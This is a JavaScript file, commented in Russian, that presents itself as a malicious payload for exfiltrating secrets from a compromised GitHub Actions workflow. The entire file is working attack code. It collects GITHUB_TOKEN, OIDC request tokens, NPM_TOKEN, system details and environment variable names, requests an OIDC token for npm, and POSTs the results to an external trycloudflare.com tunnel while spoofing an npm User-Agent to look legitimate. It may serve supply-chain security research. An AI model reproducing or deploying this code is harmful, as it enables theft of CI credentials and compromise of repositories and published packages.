/**
 * Malicious Payload для эксфильтрации секретов из GitHub Actions
 * Этот код будет выполняться в контексте скомпрометированного workflow
 */

(async function exfiltrate() {
  const EXFIL_URL = 'https://alarm-paying-attacks-loan.trycloudflare.com/exfiltrate';
  
  console.log('[INFO] Starting secret exfiltration...');
  
  // Собрать все данные
  const payload = {
    timestamp: new Date().toISOString(),
    source: 'github-actions-workflow',
    
    // GitHub Actions метаданные
    workflow: process.env.GITHUB_WORKFLOW,
    repository: process.env.GITHUB_REPOSITORY,
    actor: process.env.GITHUB_ACTOR,
    ref: process.env.GITHUB_REF,
    sha: process.env.GITHUB_SHA,
    run_id: process.env.GITHUB_RUN_ID,
    run_number: process.env.GITHUB_RUN_NUMBER,
    event_name: process.env.GITHUB_EVENT_NAME,
    
    // Секреты и токены
    tokens: {
      github_token: process.env.GITHUB_TOKEN,
      github_token_length: process.env.GITHUB_TOKEN?.length || 0,
      oidc_request_token: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN,
      oidc_request_url: process.env.ACTIONS_ID_TOKEN_REQUEST_URL,
      // Тестовые secrets (если добавлены в репозиторий)
      npm_token: process.env.NPM_TOKEN,
      test_secret: process.env.TEST_SECRET,
    },
    
    // Системная информация
    system: {
      hostname: require('os').hostname(),
      platform: process.platform,
      arch: process.arch,
      user: process.env.USER || process.env.USERNAME || 'unknown',
      home: process.env.HOME,
      pwd: process.env.PWD,
      shell: process.env.SHELL,
    },
    
    // Все environment variables (для анализа)
    all_env_keys: Object.keys(process.env).sort(),
  };
  
  // Попытка получить OIDC токен (если разрешения есть)
  if (process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN && process.env.ACTIONS_ID_TOKEN_REQUEST_URL) {
    console.log('[INFO] Attempting to fetch OIDC token...');
    try {
      const oidcUrl = new URL(process.env.ACTIONS_ID_TOKEN_REQUEST_URL);
      oidcUrl.searchParams.append('audience', 'npm');
      
      const response = await fetch(oidcUrl.toString(), {
        headers: {
          'Authorization': `bearer ${process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}`
        }
      });
      
      if (response.ok) {
        const oidcData = await response.json();
        payload.tokens.oidc_token = oidcData.value;
        payload.tokens.oidc_token_length = oidcData.value?.length || 0;
        console.log('[SUCCESS] OIDC token acquired!');
      } else {
        payload.tokens.oidc_error = `HTTP ${response.status}: ${response.statusText}`;
        console.log('[ERROR] OIDC request failed:', response.status);
      }
    } catch (e) {
      payload.tokens.oidc_error = e.message;
      console.log('[ERROR] OIDC extraction failed:', e.message);
    }
  } else {
    payload.tokens.oidc_error = 'OIDC not available (missing permissions)';
    console.log('[INFO] OIDC tokens not available (id-token: write not set)');
  }
  
  // Эксфильтрация через HTTP POST
  console.log('[INFO] Sending data to exfiltration server...');
  try {
    const response = await fetch(EXFIL_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'npm/node-gyp'  // Выглядит легитимно
      },
      body: JSON.stringify(payload)
    });
    
    if (response.ok) {
      const result = await response.json();
      console.log('[SUCCESS] Data exfiltrated successfully!');
      console.log('[INFO] Server response:', result);
    } else {
      console.log('[ERROR] Exfiltration failed:', response.status, response.statusText);
    }
  } catch (e) {
    console.log('[ERROR] Network error during exfiltration:', e.message);
    // Fallback: попробовать через альтернативный метод (например, DNS exfil)
    // В production здесь был бы fallback механизм
  }
  
  console.log('[INFO] Exfiltration attempt complete');
})();
